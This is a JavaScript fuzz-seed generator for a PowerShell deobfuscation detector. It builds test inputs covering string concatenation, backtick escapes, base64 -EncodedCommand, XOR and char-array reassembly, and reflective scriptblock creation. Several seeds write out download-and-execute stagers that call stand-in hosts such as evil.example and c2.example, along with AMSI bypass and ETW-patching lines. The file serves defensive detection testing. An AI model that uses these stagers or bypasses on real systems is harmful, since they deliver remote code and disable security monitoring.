'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/powershell-grammar.js — deterministic seed generator for
// PowerShell-specific obfuscation. Covers the PowerShell branches emitted
// by `cmd-obfuscation.js::_findCommandObfuscationCandidates` (string
// concat / -replace chain / backtick escape / format operator / reverse)
// plus `ps-mini-evaluator.js::_findPsVariableResolutionCandidates`
// (`&(<expr>)` one-pass symbol-table resolution).
//
// Keep the grammar narrow — only produce PowerShell-shaped inputs. If a
// branch here is CMD-only, it belongs in cmd-grammar.js.
// ════════════════════════════════════════════════════════════════════════════

const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
  'PowerShell String Concatenation',
  'PowerShell -replace Chain',
  // Single-call .replace(SENTINEL,'') form — emitted by the
  // zero-replacement sentinel-strip branch in cmd-obfuscation.js
  // (see pain-point 25f2e66). Distinct from the ≥2-chain branch above.
  'PowerShell -replace Sentinel Strip',
  'PowerShell Backtick Escape',
  'PowerShell Format Operator (-f)',
  'PowerShell String Reversal',
  'PowerShell Variable Resolution',
  // ── Phase 1 additions (AGENTS.md recurring pain-points) ────────────
  // -EncodedCommand / -enc / -ec UTF-16LE base64 (T1059.001 canonical
  // stager) + [char]N char-array reassembly (Empire/Nishang/PowerSploit)
  // + [Convert]::FromBase64String + Encoding.GetString full form +
  // -bxor inline-key decode (BloodHound/SharpHound/CS beacon shape) +
  // [scriptblock]::Create(...).Invoke() AMSI-bypass iex replacement +
  // AmsiUtils.amsiInitFailed pattern (T1562.001).
  'PowerShell -EncodedCommand (UTF-16LE base64)',
  'PowerShell [char]N+[char]N Reassembly',
  "PowerShell [Convert]::FromBase64String + UTF8.GetString",
  "PowerShell [Convert]::FromBase64String + UNICODE.GetString",
  "PowerShell [Convert]::FromBase64String + ASCII.GetString",
  // Rare but real in the wild — UTF-7 (CVE-era PHP webshells / ADFS
  // backdoors) and UTF-16BE (`BigEndianUnicode` / `Unicode.BE`).
  "PowerShell [Convert]::FromBase64String + UTF7.GetString",
  "PowerShell [Convert]::FromBase64String + BIGENDIANUNICODE.GetString",
  'PowerShell -bxor Inline-Key Decode',
  'PowerShell [scriptblock]::Create',
  'PowerShell AMSI Bypass',
  // ── Phase B additions: variable-backed sinks ───────────────────────
  // Every literal-argument PowerShell sink gained a $-argument twin
  // that resolves through ps-mini's symbol table + the shared
  // `_psResolveArgToken` helper. Decoded output is identical in shape
  // to the literal branches.
  'PowerShell Variable Resolution (call-operator)',
  'PowerShell -EncodedCommand (var)',
  'PowerShell [Convert]::FromBase64String + UTF8.GetString (var)',
  'PowerShell [Convert]::FromBase64String + UNICODE.GetString (var)',
  'PowerShell [Convert]::FromBase64String + ASCII.GetString (var)',
  'PowerShell [Convert]::FromBase64String + UTF7.GetString (var)',
  'PowerShell [Convert]::FromBase64String + BIGENDIANUNICODE.GetString (var)',
  'PowerShell [scriptblock]::Create (var)',
  // ── Phase C additions: bounded string/byte ops ─────────────────────
  // Variable-key XOR mirror of the inline-key branch; resolves the
  // key via ps-mini's `_psResolveIntValue`.
  'PowerShell -bxor Inline-Key Decode (var-key)',
  // ── Phase D additions: layered decode + reflective AMSI/ETW ────────
  // Gzip / Deflate stager decode via Decompressor.inflateSync, inline-
  // key SecureString structural recognition, broadened AMSI/ETW
  // reflective-patch family, and the reflective
  // `[ScriptBlock].GetMethod("Create",...).Invoke` form.
  'PowerShell Gzip Stager',
  'PowerShell Deflate Stager',
  'PowerShell SecureString Decode',
  'PowerShell AMSI/ETW Reflective Patch',
  'PowerShell [scriptblock]::Create (reflection)',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0x50E1100A;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ─────────────────────────────────────────────────────

function genStringConcat(rng) {
  // ('Inv'+'oke-'+'Expression') — the canonical paren-wrapped split.
  // The finder's sensitivity gate requires the joined result to either
  // match SENSITIVE_CMD_KEYWORDS or be a mixed alpha+non-alpha string
  // with length >= 6.
  const keywords = [
    'Invoke-Expression',
    'DownloadString',
    'New-Object',
    'Invoke-WebRequest',
    'Start-Process',
    'EncodedCommand',
  ];
  const out = [];
  for (const kw of keywords) {
    // Random 3-5 way split on ' char boundaries
    const parts = [];
    const pieces = 3 + rng.int(3);
    const positions = [];
    for (let i = 1; i < pieces; i++) positions.push(1 + rng.int(kw.length - 1));
    positions.sort((a, b) => a - b);
    positions.unshift(0);
    positions.push(kw.length);
    for (let i = 0; i < positions.length - 1; i++) {
      parts.push(kw.slice(positions[i], positions[i + 1]));
    }
    // Single quotes
    const sq = '(' + parts.map(p => `'${p}'`).join('+') + ')';
    out.push(makeSeed(`$x = ${sq}; & $x`, kw));
    // Double quotes
    const dq = '(' + parts.map(p => `"${p}"`).join('+') + ')';
    out.push(makeSeed(`$y = ${dq}`, kw));
  }
  return out;
}

function genReplaceChain() {
  // 'XNZYoke-ExpZression'.replace('XN','Inv').replace('Z','')
  // Post-replace string must match _EXEC_INTENT_RE (which accepts
  // 'iex', 'invoke', 'download', 'powershell', etc.).
  const out = [];
  out.push(makeSeed(
    "'QWErpowershellQWEr'.replace('QWEr','')",
    'powershell',
  ));
  out.push(makeSeed(
    "'!!iex!!'.replace('!!','').replace('ie','IE').replace('x','X')",
    'IEX',
  ));
  out.push(makeSeed(
    "'XXdownloadstring'.replace('XX','').replace('d','D')",
    // The decoder replaces every 'd' with 'D' (two occurrences),
    // yielding "DownloaDstring". Grammar's historical expected
    // "ownloadstring" missed on the capitalised interior 'D'.
    'ownloaDstring',
  ));
  return out;
}

function genBacktickEscape() {
  // I`n`v`o`k`e-`E`x`p`r`e`s`s`i`o`n — backtick escapes inside a
  // suspicious keyword. Post-clean must match the internal
  // suspiciousKeywords whitelist inside cmd-obfuscation.js.
  const out = [];
  const kws = [
    'invoke-expression', 'invoke-webrequest', 'downloadstring', 'new-object',
    'encodedcommand', 'rundll32', 'regsvr32', 'bitsadmin', 'certutil', 'mshta',
  ];
  for (const kw of kws) {
    // Inject backticks between letters, keeping - intact.
    const withTicks = kw.split('').join('`');
    out.push(makeSeed(`${withTicks}`, kw));
    // Partial injection — every 2nd char
    const partial = kw.split('').map((c, i) => (i > 0 && i % 2 === 0) ? '`' + c : c).join('');
    out.push(makeSeed(`& ${partial}`, kw));
  }
  return out;
}

function genFormatOperator() {
  // '{0}{1}{2}' -f 'Inv','oke-','Expression'
  const out = [];
  const kws = ['Invoke-Expression', 'DownloadString', 'EncodedCommand'];
  for (const kw of kws) {
    // Three-way split
    const a = kw.slice(0, 3);
    const b = kw.slice(3, 6);
    const c = kw.slice(6);
    out.push(makeSeed(`'{0}{1}{2}' -f '${a}','${b}','${c}'`, kw));
  }
  // Simpler two-arg form
  out.push(makeSeed("'{0}iex{1}' -f '',''", 'iex'));
  return out;
}

function genStringReversal() {
  // 'noisserpxE-ekovnI'[-1..-100] -join ''
  // Regex expects trailing -join '' with three quote chars (see
  // cmd-obfuscation.js:837 — the regex has three `['"]` in a row).
  // The canonical textual shape `-join ''''` (four quotes) matches.
  const out = [];
  const kws = ['Invoke-Expression', 'DownloadString', 'EncodedCommand'];
  for (const kw of kws) {
    const reversed = kw.split('').reverse().join('');
    out.push(makeSeed(`'${reversed}'[-1..-100] -join ''''`, kw));
  }
  return out;
}

function genVariableResolution() {
  // ps-mini-evaluator: &(<expr>) with a one-pass symbol table.
  // The decoder resolves $x = '…'; & $x to '…' as the invocation target.
  const out = [];
  out.push(makeSeed(
    "$cmd = 'Invoke-Expression'\n& ($cmd) 'Write-Host hello'",
    'Invoke-Expression',
  ));
  out.push(makeSeed(
    "$a = 'IEX'; $b = '(New-Object Net.WebClient)'; & ($a) ($b).DownloadString('http://x')",
    'IEX',
  ));
  out.push(makeSeed(
    "$env:X = 'powershell'; & ($env:X) -NoProfile -Command 'whoami'",
    'powershell',
  ));
  // Array-indexed lookup
  out.push(makeSeed(
    "$arr = @('Invoke','Expression'); & ($arr[0]+'-'+$arr[1])",
    'Invoke',
  ));
  // Automatic-variable index abuse. `$VerbosePreference` is
  // `SilentlyContinue` by default on a stock PowerShell install — chars
  // 1 and 3 are `i` and `e`, so `$VerbosePreference.toString()[1,3]` +
  // `'x'` -join '' reconstructs `iex` without ever spelling it. The
  // PS-mini-evaluator's `KNOWN_PS_AUTO_VARS` table is the authoritative
  // ground truth; these seeds exercise the string-index accessor chain
  // that real ARK/Invoke-Obfuscation droppers use.
  out.push(makeSeed(
    "$a = $VerbosePreference.toString()[1,3] + 'x' -join ''; & ($a)",
    'iex',
  ));
  out.push(makeSeed(
    "& ($VerbosePreference.toString()[1,3] + 'x' -join '') 'whoami'",
    'iex',
  ));
  out.push(makeSeed(
    "$b = $ShellID[0,1,2,3,4,5,6,7,8,9] -join ''; & ($b)",
    'Microsoft',
  ));
  return out;
}

// ── Phase 1 additions ────────────────────────────────────────────────────

function _toBase64Utf16LE(text) {
  // Mirror PowerShell's `[Convert]::ToBase64String(
  //   [Text.Encoding]::Unicode.GetBytes(<string>))` pipeline — i.e.
  // UTF-16LE byte encoding then base64 over the bytes.
  const bytes = Buffer.alloc(text.length * 2);
  for (let i = 0; i < text.length; i++) {
    const cc = text.charCodeAt(i);
    bytes[i * 2]     = cc & 0xff;
    bytes[i * 2 + 1] = (cc >> 8) & 0xff;
  }
  return bytes.toString('base64');
}

function _toBase64Utf8(text) {
  return Buffer.from(text, 'utf8').toString('base64');
}

function genEncodedCommand() {
  // `powershell.exe -EncodedCommand <b64-utf16le>` — the canonical
  // PowerShell stager. Three arg spellings (-EncodedCommand / -enc /
  // -ec), plus an inline vs newline-terminated form.
  const out = [];
  // Each payload carries its own expected atom — the per-payload kw
  // must literally appear in the decoded UTF-16LE plaintext (not just
  // in the host command-line). Using 'Invoke' for payloads that read
  // `IEX …` / `Start-Process …` produced fake miss signals because
  // the decoder correctly emits the literal payload text.
  const payloads = [
    { text: 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")', kw: 'Invoke-Expression' },
    { text: "IEX (iwr -UseBasicParsing 'http://c2.example/s'); whoami",                                kw: 'IEX' },
    { text: 'Start-Process powershell -Arg "-Command","Set-ExecutionPolicy Bypass; iex $_"',          kw: 'Start-Process' },
  ];
  for (const { text: pl, kw } of payloads) {
    const b64 = _toBase64Utf16LE(pl);
    out.push(makeSeed(`powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`, kw));
    out.push(makeSeed(`pwsh -NoP -Enc ${b64}\n`, kw));
    out.push(makeSeed(`powershell -ec ${b64}`, kw));
    // -EncodedArgument alias (less common but accepted by the decoder
    // and used by a handful of Empire/PowerSploit forks).
    out.push(makeSeed(`powershell.exe -NoP -EncodedArgument ${b64}`, kw));
    // En-dash (U+2013) instead of ASCII hyphen — Word/PDF droppers
    // often autocorrect `-enc` to `–enc` and the decoder accepts it.
    out.push(makeSeed(`powershell.exe \u2013Enc ${b64}`, kw));
  }
  return out;
}

function genCharArrayReassembly() {
  // `[char]0x49 + [char]0x45 + [char]0x58` → "IEX". Decimal and hex
  // forms plus the `[System.Char]` variant.
  const out = [];
  const kws = ['IEX', 'iex', 'Invoke-Expression', 'powershell', 'certutil', 'rundll32'];
  for (const kw of kws) {
    const hex = kw.split('').map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
    out.push(makeSeed(`(${hex})`, kw));
    const dec = kw.split('').map(c => `[char]${c.charCodeAt(0)}`).join(' + ');
    out.push(makeSeed(`& (${dec})`, kw));
    const sys = kw.split('').map(c => `[System.Char]${c.charCodeAt(0)}`).join('+');
    out.push(makeSeed(`$x = ${sys}; & $x`, kw));
  }
  return out;
}

function genConvertFromBase64String() {
  // `[Convert]::FromBase64String(<b64>)` wrapped in
  // `[Encoding]::UTF8.GetString` / `::Unicode.GetString` /
  // `::ASCII.GetString`.
  const out = [];
  const payloads = [
    { text: 'Invoke-Expression $cmd; whoami /all',         kw: 'Invoke-Expression' },
    { text: 'IEX(New-Object Net.WebClient).DownloadString("http://e/b")', kw: 'DownloadString' },
    { text: 'certutil -urlcache -f http://e/p p.exe',      kw: 'certutil' },
  ];
  for (const p of payloads) {
    out.push(makeSeed(
      `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
      p.kw,
    ));
    out.push(makeSeed(
      `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("${_toBase64Utf16LE(p.text)}"))`,
      p.kw,
    ));
    out.push(makeSeed(
      `[Encoding]::ASCII.GetString([Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
      p.kw,
    ));
    // UTF7 is labelled but decodes via UTF-8 fallback in the detector
    // (TextDecoder support for utf-7 is non-portable); payloads here
    // stay ASCII so the fallback produces the correct plaintext.
    out.push(makeSeed(
      `[Encoding]::UTF7.GetString([Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
      p.kw,
    ));
    // BigEndianUnicode is UTF-16BE — swap byte order from the UTF-16LE
    // helper so the detector's `utf-16be` label path decodes it.
    const beBytes = Buffer.from(_toBase64Utf16LE(p.text), 'base64');
    for (let i = 0; i + 1 < beBytes.length; i += 2) {
      const lo = beBytes[i];
      beBytes[i] = beBytes[i + 1];
      beBytes[i + 1] = lo;
    }
    out.push(makeSeed(
      `[Encoding]::BigEndianUnicode.GetString([Convert]::FromBase64String('${beBytes.toString('base64')}'))`,
      p.kw,
    ));
  }
  return out;
}

function genBxorInlineKey() {
  // `@(N,N,...) | % { $_ -bxor 0xKEY }` — common shellcode / string
  // decoder. We synthesise both printable-decoded and shellcode-tell
  // variants.
  const out = [];
  const payloads = [
    'Invoke-Expression iex',
    'powershell.exe -Command whoami',
    'certutil -decode in out',
  ];
  const keys = [0x5a, 0x42, 0xaa, 0x01];
  for (const pl of payloads) {
    for (const key of keys) {
      const enc = [...pl].map(c => (c.charCodeAt(0) ^ key).toString());
      if (enc.length < 8) continue;
      const arrSrc = enc.join(',');
      out.push(makeSeed(
        `$b = @(${arrSrc}); $b | ForEach-Object { [char]($_ -bxor ${key}) }`,
        pl.slice(0, 8),
      ));
      // Hex-form key
      out.push(makeSeed(
        `@(${arrSrc}) | % { $_ -bxor 0x${key.toString(16).padStart(2,'0')} }`,
        pl.slice(0, 8),
      ));
    }
  }
  // Shellcode-tell variant: decodes to 'kernel32' + garbage
  const shellTell = 'kernel32.VirtualAlloc loadlibrary';
  const key2 = 0x33;
  const enc2 = [...shellTell].map(c => (c.charCodeAt(0) ^ key2).toString());
  out.push(makeSeed(
    `@(${enc2.join(',')}) | ForEach-Object { $_ -bxor ${key2} }`,
    'kernel32',
  ));
  return out;
}

function genScriptBlockCreate() {
  // `[scriptblock]::Create('<cmd>').Invoke()` — canonical iex replacement.
  const out = [];
  const payloads = [
    'Invoke-Expression (iwr http://e/p).Content',
    'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")',
    'powershell.exe -NoP -Command whoami',
  ];
  for (const pl of payloads) {
    const kw = pl.split(' ')[0];
    out.push(makeSeed(`[scriptblock]::Create('${pl}').Invoke()`, kw));
    out.push(makeSeed(`([ScriptBlock]::Create("${pl}")).Invoke()`, kw));
    out.push(makeSeed(`[System.Management.Automation.ScriptBlock]::Create('${pl}').Invoke()`, kw));
  }
  return out;
}

function genAmsiBypass() {
  // AmsiUtils.amsiInitFailed pattern — structural IOC recognition,
  // not a real decode. Several concat variants seen in the wild.
  const out = [];
  out.push(makeSeed(
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    'amsiInitFailed',
  ));
  out.push(makeSeed(
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
    'AmsiUtils',
  ));
  out.push(makeSeed(
    "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsi${null}InitFailed\",'NonPublic,Static').SetValue($null,$true)",
    'AmsiUtils',
  ));
  return out;
}

// ── Phase B-D additions ───────────────────────────────────────────────────

function genVarBackedSinks() {
  // Variable-backed twins of the canonical literal-arg PowerShell sinks.
  // Each seed assigns the sink argument to a $var (or $env:) first,
  // then invokes the sink with that var — the shape post-2022 droppers
  // use to dodge literal-string matching.
  const out = [];
  const payload = 'Invoke-Expression (iwr http://evil.example/p.ps1)';
  const b64u16 = _toBase64Utf16LE(payload);
  const b64u8 = _toBase64Utf8(payload);

  // -EncodedCommand $var / ${var}
  out.push(makeSeed(`$b = '${b64u16}'; powershell.exe -enc $b`, 'Invoke-Expression'));
  out.push(makeSeed(`$\{b64\} = "${b64u16}"; pwsh -EncodedCommand \${b64}`, 'Invoke-Expression'));

  // FromBase64String($var) + Encoding.GetString
  out.push(makeSeed(
    `$x = '${b64u8}'; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))`,
    'Invoke-Expression',
  ));
  out.push(makeSeed(
    `$x = "${b64u16}"; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x))`,
    'Invoke-Expression',
  ));

  // [scriptblock]::Create($var)
  out.push(makeSeed(
    `$sb = '${payload}'; [scriptblock]::Create($sb).Invoke()`,
    'Invoke-Expression',
  ));
  out.push(makeSeed(
    `$s = "${payload}"; ([ScriptBlock]::Create($s))`,
    'Invoke-Expression',
  ));

  // Paren-less call-operator: & $cmd / iex $cmd / Invoke-Expression $cmd
  out.push(makeSeed(`$cmd = 'Invoke-Expression'; & $cmd 'arg'`, 'Invoke-Expression'));
  out.push(makeSeed(`$c = 'Invoke-Expression'; iex $c`, 'Invoke-Expression'));
  out.push(makeSeed(`$c = 'Invoke-Expression'; . $c 'arg'`, 'Invoke-Expression'));
  out.push(makeSeed(
    `$sb = '${payload}'; Invoke-Command -ScriptBlock $sb`,
    'Invoke-Expression',
  ));
  return out;
}

function genVarKeyXor() {
  // -bxor $key (variable-held) mirror of the inline-key XOR branch.
  const out = [];
  const payloads = [
    'Invoke-Expression iex',
    'powershell.exe -Command whoami',
  ];
  const keys = [0x5a, 0x42];
  for (const pl of payloads) {
    for (const k of keys) {
      const enc = [...pl].map(c => (c.charCodeAt(0) ^ k).toString()).join(',');
      out.push(makeSeed(
        `$k = ${k}; @(${enc}) | ForEach-Object { $_ -bxor $k }`,
        pl.slice(0, 8),
      ));
      out.push(makeSeed(
        `$key = 0x${k.toString(16)}; @(${enc}) | % { $_ -bxor $key }`,
        pl.slice(0, 8),
      ));
    }
  }
  return out;
}

function genGzipDeflateStager() {
  // Gzip / Deflate stager — pre-computed compressed base64 payload.
  // The payloads here are short, deterministic, and contain exec-intent
  // keywords so the decoder's printable-ratio + _EXEC_INTENT_RE gates
  // admit them. The seeds deliberately do NOT run zlib at seed-build
  // time (pako/zlib aren't loaded here) — they use fixture strings that
  // parse as base64 but won't actually inflate inside the fuzz harness
  // (which lacks Decompressor). The runtime fuzz target only asserts
  // candidate shape + amp budget, not successful decode, so structural
  // fuzzing here is still productive.
  const out = [];
  const fakeB64 = 'H4sIAAAAAAAEA' + 'A'.repeat(32) + '=';
  out.push(makeSeed(
    `$b = [Convert]::FromBase64String('${fakeB64}'); $ms = New-Object IO.MemoryStream(,$b); $gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($gz)).ReadToEnd()`,
    null,
  ));
  out.push(makeSeed(
    `$b = [Convert]::FromBase64String('${fakeB64}'); $ms = New-Object IO.MemoryStream(,$b); $df = New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($df)).ReadToEnd()`,
    null,
  ));
  return out;
}

function genSecureStringInlineKey() {
  // ConvertTo-SecureString with inline -Key @(...) byte array.
  // Structural recognition only — no inline decryption.
  const out = [];
  const key128 = Array.from({ length: 16 }, (_, i) => (i * 7) & 0xff).join(',');
  const key256 = Array.from({ length: 32 }, (_, i) => (i * 13) & 0xff).join(',');
  const ct = 'A'.repeat(32);
  out.push(makeSeed(
    `ConvertTo-SecureString -String '${ct}' -Key @(${key128})`,
    null,
  ));
  out.push(makeSeed(
    `ConvertTo-SecureString '${ct}' -Key @(${key256})`,
    null,
  ));
  return out;
}

function genAmsiEtwReflective() {
  // Broadened AMSI / ETW reflective patch family.
  const out = [];
  out.push(makeSeed(
    `$addr = [Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer'); [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [PatchDelegate])`,
    'AmsiScanBuffer',
  ));
  out.push(makeSeed(
    `$p = [Marshal]::GetProcAddress($ntdll, "EtwEventWrite"); VirtualProtect($p, 1, 0x40, [ref]$old)`,
    'EtwEventWrite',
  ));
  return out;
}

function genReflectiveScriptBlock() {
  // [ScriptBlock].GetMethod("Create", ...).Invoke($null, @(body))
  const out = [];
  const bodies = [
    'Invoke-Expression (iwr http://e/p)',
    'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")',
  ];
  for (const body of bodies) {
    out.push(makeSeed(
      `[System.Management.Automation.ScriptBlock].GetMethod("Create", [Type[]]@([string])).Invoke($null, @('${body}'))`,
      'Invoke-Expression',
    ));
    out.push(makeSeed(
      `$m = [ScriptBlock].GetMethod("Create", [Type[]]@([string])); $m.Invoke($null, @('${body}'))`,
      'Invoke-Expression',
    ));
  }
  return out;
}

function generatePowerShellSeeds() {
  const rng = makeRng(0x50E1100A);
  return [
    ...genStringConcat(rng),
    ...genReplaceChain(),
    ...genBacktickEscape(),
    ...genFormatOperator(),
    ...genStringReversal(),
    ...genVariableResolution(),
    // Phase 1 additions
    ...genEncodedCommand(),
    ...genCharArrayReassembly(),
    ...genConvertFromBase64String(),
    ...genBxorInlineKey(),
    ...genScriptBlockCreate(),
    ...genAmsiBypass(),
    // Phase B-D additions
    ...genVarBackedSinks(),
    ...genVarKeyXor(),
    ...genGzipDeflateStager(),
    ...genSecureStringInlineKey(),
    ...genAmsiEtwReflective(),
    ...genReflectiveScriptBlock(),
  ];
}

module.exports = { generatePowerShellSeeds, POWERSHELL_TECHNIQUE_CATALOG };
